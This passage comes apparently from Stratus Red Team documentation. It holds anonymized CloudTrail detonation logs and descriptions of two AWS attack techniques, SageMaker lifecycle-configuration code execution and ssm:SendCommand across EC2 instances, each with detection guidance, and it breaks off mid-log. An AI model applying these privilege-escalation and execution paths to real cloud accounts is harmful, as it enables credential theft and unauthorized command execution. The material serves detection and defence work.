\"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:47Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"1758f71e-47d0-4fa3-9875-315bc7183bb3\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"e787e1ad-fa7c-4b91-9587-9beffd68488a\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:45Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"e9c76e24-ef65-4fdc-b30e-145643c6913a\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"40afc14c-3dd8-4195-b4d3-89f1173d368f\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:43Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"ed3889da-12fc-434b-8e5d-5bcf122b46fe\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"8bc46582-5202-4857-879e-b57a94862895\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:41Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"1b8980f2-0a5e-4e6a-8a5a-82a4982d4a36\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"7470d5b5-0e71-4bd2-9809-8b8e9499b8e2\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:40Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"2d9bbbbf-86ab-4e36-8f44-66b9cc568571\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"570ab1e6-8222-4db2-a688-6c1a37cc9968\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:38Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"33647962-fb50-4bc9-9465-13d237860e4f\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"9ed4f1c7-607c-4c88-bcb6-053a03fd30cc\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:37Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"88449386-205f-4091-b667-5b9efc5ce256\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"7c46e00c-5eba-40c4-8a5c-3788c10af6fd\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:35Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"40f0177a-b1a4-44a4-b6c5-87fd9e44849e\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"4edfbd95-32ab-4abc-9b07-5e371a9af5da\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:34Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"cc43b6de-04d9-4435-9ecc-46a575b0950d\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"8ffd8499-55e5-4487-b1c8-f73ab389db84\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:32Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"0a967e8c-b6ed-4870-aec5-edca45b2e00c\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"bfdbd679-9ac4-41e0-84f6-2be3ac12d3e5\",\n      \"eventName\": \"DescribeInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:30Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"14975c6a-e0f8-4abf-b731-5a21a8249464\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ca-northsouth-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"d373b5dd-6a82-439d-bdcf-4e6c7c7a9292\",\n      \"eventName\": \"StopInstances\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:03:30Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"309303190113\",\n      \"requestID\": \"088dba72-717e-4502-a3c5-5c95f22f87c1\",\n      \"requestParameters\": {\n         \"force\": true,\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\"\n               }\n            ]\n         }\n      },\n      \"responseElements\": {\n         \"instancesSet\": {\n            \"items\": [\n               {\n                  \"currentState\": {\n                     \"code\": 64,\n                     \"name\": \"stopping\"\n                  },\n                  \"instanceId\": \"i-DDd6c7B0e18F0E35f\",\n                  \"previousState\": {\n                     \"code\": 16,\n                     \"name\": \"running\"\n                  }\n               }\n            ]\n         },\n         \"requestId\": \"088dba72-717e-4502-a3c5-5c95f22f87c1\"\n      },\n      \"sourceIPAddress\": \"251.228.255.218\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.ca-northsouth-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_54d79918-8729-4201-83e6-6a600173b8e3\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAZI86ACIZ2J9CV86Z\",\n         \"accountId\": \"309303190113\",\n         \"arn\": \"arn:aws:iam::309303190113:user/christophe\",\n         \"principalId\": \"AIDAV0KQ3LIBUIGZ52WB\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.execution.sagemaker-update-lifecycle-config/","title":"Execute Commands on SageMaker Notebook Instance via Lifecycle Configuration","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.execution.sagemaker-update-lifecycle-config/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Execution</li> </ul> </li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.sagemaker-update-lifecycle-config/#description","title":"Description","text":"<p>An attacker with permissions to stop, update, and start a SageMaker Notebook instance can execute code inside this instance by attaching a malicious lifecycle configuration script to a stopped instance. When the instance is restarted, this script executes automatically, allowing the attacker execute arbitrary commands, for instance to exfiltrate the instance's IAM execution role credentials.</p> <p>Warm-up:</p> <ul> <li>Create a SageMaker Notebook Instance with an IAM Execution Role that possesses sensitive privileges (the victim role). </li> <li>Create an Attacker IAM Identity with only the permissions to stop, update, and start the notebook and to inject a malicious lifecycle configuration script.</li> </ul> <p>Detonation: </p> <ul> <li>Update the lifecycle configuration script via a Stop-Update-Start API sequence</li> <li>Execute malicious code</li> </ul> <p>References:</p> <ul> <li>https://www.plerion.com/blog/privilege-escalation-with-sagemaker-and-execution-roles</li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.sagemaker-update-lifecycle-config/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.execution.sagemaker-update-lifecycle-config\n</code></pre>"},{"location":"attack-techniques/AWS/aws.execution.sagemaker-update-lifecycle-config/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>UpdateNotebookInstance</code> events.  You can also watch for suspicious sequences of <code>StopNotebookInstance</code> and <code>StopNotebookInstance</code> events correlated with <code>UpdateNotebookInstance</code> events. </p>"},{"location":"attack-techniques/AWS/aws.execution.ssm-send-command/","title":"Usage of ssm:SendCommand on multiple instances","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.execution.ssm-send-command/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Execution</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ssm-send-command/#description","title":"Description","text":"<p>Simulates an attacker utilizing AWS Systems Manager (SSM) to execute commands through SendCommand on multiple EC2 instances.</p> <p>Warm-up:</p> <ul> <li>Create multiple EC2 instances and a VPC (takes a few minutes).</li> </ul> <p>Detonation: </p> <ul> <li>Runs <code>ssm:SendCommand</code> on several EC2 instances, to execute the command <code>echo \"id=$(id), hostname=$(hostname)\"</code> on each of them.</li> </ul> <p>References:</p> <ul> <li>https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/#send-command</li> <li>https://www.chrisfarris.com/post/aws-ir/</li> <li>https://www.invictus-ir.com/news/aws-cloudtrail-cheat-sheet</li> <li>https://securitycafe.ro/2023/01/17/aws-post-explitation-with-ssm-sendcommand/</li> </ul>"},{"location":"attack-techniques/AWS/aws.execution.ssm-send-command/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.execution.ssm-send-command\n</code></pre>"},{"location":"attack-techniques/AWS/aws.execution.ssm-send-command/#detection","title":"Detection","text":"<p>Identify, through CloudTrail's <code>SendCommand</code> event, especially when <code>requestParameters.instanceIds</code> contains several instances. Sample event:</p> <pre><code>{\n  \"eventSource\": \"ssm.amazonaws.com\",\n  \"eventName\": \"SendCommand\",\n  \"requestParameters\": {\n    \"instanceIds\": [\n      \"i-0f364762ca43f9661\",\n      \"i-0a86d1f61db2b9b5d\",\n      \"i-08a69bfbe21c67e70\"\n    ],\n    \"documentName\": \"AWS-RunShellScript\",\n    \"parameters\": \"HIDDEN_DUE_TO_SECURITY_REASONS\",\n    \"interactive\": false\n  }\n}\n</code></pre> <p>While this technique uses a single call to <code>ssm:SendCommand</code> on several instances, an attacker may use one call per instance to execute commands on. In that case, the <code>SendCommand</code> event will be emitted for each call.</p>"},{"location":"attack-techniques/AWS/aws.execution.ssm-send-command/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>ssm:DescribeInstanceInformation</code></p> </li> <li> <p><code>ssm:GetCommandInvocation</code></p> </li> <li> <p><code>ssm:SendCommand</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"4723aee9-d1e5-4e32-b48c-0ec39a6d84ea\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:27Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"6edac2c5-52c8-4de5-9d8f-2d1bdc2f9e8b\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"bbef7fa1-ec6b-42ca-ae50-a95610fc81d3\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:26Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"083a9fde-def5-4328-bbab-1bd8b0c137cb\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"d6738500-de0a-4a7d-af41-c42225b1d627\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:23Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"cdf0af8d-32e8-4094-b5ad-0ad6aa898a2b\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"5ceab743-d517-46d5-b162-bf881ae0be0c\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:21Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"b48c0a2a-5c9b-4bd9-9e2a-74c84a55aefe\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": 